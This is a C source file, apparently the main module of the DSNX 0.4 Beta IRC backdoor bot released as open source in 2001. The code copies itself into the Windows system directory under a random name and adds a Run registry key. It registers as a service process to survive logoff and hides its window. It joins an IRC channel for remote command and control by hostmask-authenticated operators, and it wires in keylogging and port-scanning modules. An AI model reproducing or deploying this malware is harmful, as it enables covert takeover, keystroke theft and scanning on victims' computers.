/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock.h>
#include <stdlib.h>
#include <time.h>

#include "..\include\options.h"
#include "..\include\globals.h"
#include "..\include\IOHandler.h"
#include "..\include\Base.h"
#include "..\include\mainbot.h"
#include "..\include\main.h"
#include "..\include\file.h"
#include "..\include\ident.h"
#include "..\include\tcp.h"
#include "..\include\SettingStorage.h"
#include "..\include\nicknames.h"
#include "..\include\keylogger.h"
#include "..\include\portscan.h"

//Used alot
char d_USR[]		= " \0";
char c_JOIN[]		= "join \0";
char c_PART[]		= "part \0";
char c_NICK[]		= "nick \0";
char c_PRIVMSG[]	= "privmsg \0";
char c_NOTICE[]		= "notice \0";
char c_NICKSERV[]	= "nickserv \0";
char c_CHANSERV[]	= "chanserv \0";
char c_QUITMSG[]	= "QUIT :j0\n\0";
char c_VERSION[]	= "DSNX V0.4 Beta\0";
char c_KEYLOGGING_FILE[] = "temp.tmp\0";
char c_DOUBLE_STRINGS[] = "%s%s\n\0";

BOOL Shuttingdown = FALSE;
//Some standard error replies
char c_OUT_OF_IOHANDLERS[] = "Not enough free IO handlersr\0";
char c_STOPPED[] = "Stoppedb\0";
char c_STARTED[] = "Startedb\0";


char g_InstallTo[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\0";
char g_IKey[] = "WinDSNX\0";

long l_UP =0;						 //For Uptime
IOHandler *g_IOSock = new IOHandler; //MAIN IO Handler
HWND g_hwnd;						 //Handle to our window
//BOOL g_IsWinNT =FALSE;			 //Windows 2k?
char **g_cHostAllows;				 //For hostmask authentication
int g_iHostAllows=0;				 //For hostmask authentication

#ifdef _DSNX_USE_GETSETTING //Debug or Release?

	SettingRetrv *g_SStore = new SettingRetrv();

#else

//	char c_DSNX_IRCSERVER[] = "192.168.0.3\0";
//	char c_DSNX_IRCSERVER[] = "hydro.lcirc.net\0";
	char c_DSNX_IRCSERVER[] = "localhost\0";
	char c_DSNX_CHANNEL[]	= "#idlechat\0";
	char c_DSNX_PASSWORD[]	= "password\0";
	char c_DSNX_HOSTMASK[]	= "dataspy!*@*;homie*;coolio!*@*;aj*";
	char c_DSNX_PORT[]		= "6667\0";
	char c_DSNX_PREFIX[]	= "!\0";
	char c_DSNX_REPLYTOCHAN[] =  "c\0";//r_CHANNEL;// r_QUERY r_NOTICE r_CHANNEL;

#endif

//Processes incoming data, With a new thread each time
DWORD WINAPI LoadPThread(LPVOID lpArgs)
{
	SOCKET The_Socket = ((LPTData *)lpArgs)->wParam;
	unsigned int lParam = ((LPTData *)lpArgs)->lParam;
	unsigned int iMessage = ((LPTData *)lpArgs)->iMessage;
	
	  if(Shuttingdown) return -1;
	TcpSock *pTemp = g_IOSock->GetPFromMessageID(iMessage);
	if (pTemp == INVALID_IO_HANDLER)
	{
		pTemp = g_IOSock->GetPFromSocketNum(The_Socket);
		if (pTemp == INVALID_IO_HANDLER)
		{
			return -1; //No Socket Handler
		}
	}
	
	delete lpArgs;

	switch(lParam)
	{
		case(FD_ACCEPT):

			pTemp->Accept(The_Socket);
			return FD_ACCEPT;

		case (FD_READ):

			pTemp->DataIn(The_Socket);
			return FD_READ;
		
		case (FD_CLOSE):

			pTemp->Close(The_Socket);
			return FD_CLOSE;
	
	}
	return lParam;
/*
#define FD_READ         0x01 1
#define FD_WRITE        0x02 2
#define FD_OOB          0x04 4
#define FD_ACCEPT       0x08 8 
#define FD_CONNECT      0x10 16
#define FD_CLOSE        0x20 32
*/
}

char *g_Del;

int DoInfect()
{
	int iRet=0;	
	char *cSys = new char[256],*cReg;
	
	GetSystemDirectory(cSys,256);
	
	//Are we in the system directory?
	if (strncmp(g_EXEName,cSys,lstrlen(cSys)) != 0)
	{
		char *cOpy = new char[300];
		sprintf (cOpy,"%s\\win%s.exe",cSys,RandomText(4));
		CopyFile(g_EXEName,cOpy,FALSE);
		g_Del = strcpy(new char[lstrlen(g_EXEName)],g_EXEName);
		g_EXEName = cReg =cOpy;
		iRet =-1;
	} else
		cReg = g_EXEName;

	HKEY hKey;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,g_InstallTo,0,KEY_ALL_ACCESS,&hKey) !=0) return 1;
	RegSetValueEx(hKey,g_IKey,0,REG_SZ,(unsigned char*)cReg,lstrlen(cReg));
	RegCloseKey(hKey);
	return iRet;
}
int g_Restart =0;

//
//Main Application Entry
//
extern int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow)
{	
	g_EXEName = new char[256];
	GetModuleFileName(GetModuleHandle(NULL),g_EXEName,256);

#ifdef _DSNX_USE_GETSETTING

	if (strstr(lpCmdLine,"x") != NULL || strstr(lpCmdLine,"z") != NULL ) //We got some options?
	{
		char *cLen = BreakString(lpCmdLine," ");
		if (cLen)
		{
			if (lpCmdLine[0] == 'x') { //Wait before restarting
				Sleep(atoi(cLen)*1000);

			}
			else if (lpCmdLine[0] == 'z') 
			{       //Delete old file
					int iP=0;
					do {
						if (remove(cLen) == 0)	
							break;
						
						iP++;
						Sleep(1000);
								
					} while (iP < 75);
			}
		}
	} 	
	
	//We need to restart
	if (DoInfect() == -1) 
	{
		char *cRun = new char[8 + lstrlen(g_EXEName) + lstrlen(g_Del)];
		sprintf(cRun,"%s z %s",g_EXEName,g_Del);
		WinExec(cRun,SW_HIDE);
		delete cRun;
		return 0;
	}

#endif

	srand((unsigned)time(NULL));

	if(Init(hInstance, nCmdShow)) 
		return -1;

/*	OSVERSIONINFO osvi;	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	
	if(GetVersionEx(&osvi)==FALSE) g_IsWinNT = FALSE;
 
	if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) 
		g_IsWinNT = TRUE;
*/

	//Starts keylogging
	//StartLogging();

	Decode((char*)Nicks,s_NKey,NLen); Nicks[NLen] =0;

	//Register as a service process so (in win2k) if the user logs off, we stay running :P
	typedef DWORD ( *RSPP)(DWORD,DWORD ); 
	RSPP RSP; 
	HINSTANCE  hLibrary = LoadLibrary("KERNEL32.DLL");
	if (hLibrary != NULL)
	{
		RSP = (RSPP)GetProcAddress(hLibrary,"RegisterServiceProcess");
		if	(RSP !=NULL)
			(RSP)(NULL,1);
	}

	//Now split up the hostmask(s) into seperate ones for later authentication
	g_cHostAllows= new char*[lstrlen(_DSNX_HOSTMASK) / 2];
	g_cHostAllows[0] = _DSNX_HOSTMASK;
	g_iHostAllows=1;
	while (1)
	{
		if((g_cHostAllows[g_iHostAllows] = BreakString(g_cHostAllows[g_iHostAllows - 1],";\0")) == NULL)
			break;
					
		g_iHostAllows++;
	}

	//Uptime counter
	l_UP = GetTickCount();

	//Wait for an internet connection (5 minutes intervals)
	while(!IsConnected()) Sleep(300000);

	//Load Ident
	new IdentSock();
	//MainBot thank you!

	new MainBot(_DSNX_IRCSERVER,atoi(_DSNX_PORT),_DSNX_CHANNEL);

	/*char *go = new char[128];
	sprintf(go,"m #idlechat 192.168.0.3 6667\0");
	InterpretMsg(go,"","","");
	sprintf(go,"q\0");
	//InterpretMsg(go,"","","");
	*/

	MSG msg;

	//Main Application Loop
	while (GetMessage(&msg, g_hwnd, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	} 
	Shuttingdown = TRUE;
	//Kill everything
	delete g_IOSock;
	

	//Stop KeyLogging
	StopLogging();
	//Stop Port Scanning
	StopPortScanning();

	WSACleanup();

	if (g_Restart > 0) //Do we need to load it again?
	{
		char *cTemp = new char[16 + lstrlen(g_EXEName)];
		sprintf(cTemp,"%s x %i\0",g_EXEName,g_Restart);
		WinExec(cTemp,SW_HIDE);
		delete cTemp;
	}

	return 0;
}

extern long FAR PASCAL WindowProc(HWND hWnd, UINT iMsg, WPARAM wParam, LPARAM lParam) 
{

	//LMAO - Some random shit to annoy debuggers hahaha
	//int iFuckYou = Random(0,20000),iRepss = Random (0,500),iToffee = 0,iSuckIt=0;
	//for(iSuckIt =0;iSuckIt < iRepss;iSuckIt++) {if (iFuckYou < 5000){ iToffee += Random(0,220);	iToffee -= Random(0,50); delete RandomText(20); } else if (iFuckYou < 10000) { iToffee *= Random(0,10);
	//delete RandomText(20); iToffee -= Random(0,50); } else if (iFuckYou < 15000) { iToffee += Random(0,220); delete RandomText(20); iToffee *= Random(0,50); } else	{ iToffee -= Random(0,220);	delete RandomText(20); iToffee += Random(0,50);	delete RandomText(20); } }
	//LMAO - Some random shit to annoy debuggers hahaha

	//Is this a msg we want to deal with?
	if ( (iMsg >= MY_MESSAGE_STARTS_AT) && (iMsg <= GetNextMessageID(FALSE)) )
	{
		//Put data into struct and send off to new thread :)
		LPTData *LPTD= new LPTData;
		LPTD->iMessage = iMsg;
		LPTD->lParam = lParam;
		LPTD->wParam = wParam; ULONG ida;

		CreateThread(NULL,0,(DWORD(__stdcall *)(void *))LoadPThread,(LPVOID)LPTD,0,&ida);
	}
	return DefWindowProc(hWnd, iMsg, wParam, lParam);		
}

char *g_EXEName;

int Init(HINSTANCE hInstance, int nCmdShow)
{
	char *cTemp = RandomText(5);
	char *cTemp1 = RandomText(5);
	char *cTemp2 = RandomText(5);
	WNDCLASS wc;
    wc.lpszClassName = cTemp;
    wc.lpfnWndProc = WindowProc; //Assigns our message processor
    wc.style = CS_HREDRAW | CS_VREDRAW | CS_OWNDC;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName = cTemp1;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    RegisterClass(&wc); 
   
	g_hwnd = CreateWindowEx(WS_EX_WINDOWEDGE | WS_EX_APPWINDOW, cTemp, cTemp2,
						  WS_CLIPSIBLINGS | WS_CLIPCHILDREN | WS_OVERLAPPEDWINDOW, 0, 0, 
						  500, 500, 
						  NULL, NULL, hInstance, NULL);
	
	

	if (!g_hwnd)
		return 1;

    ShowWindow(g_hwnd, SW_HIDE);//SW_SHOWNORMAL

	return 0;
}
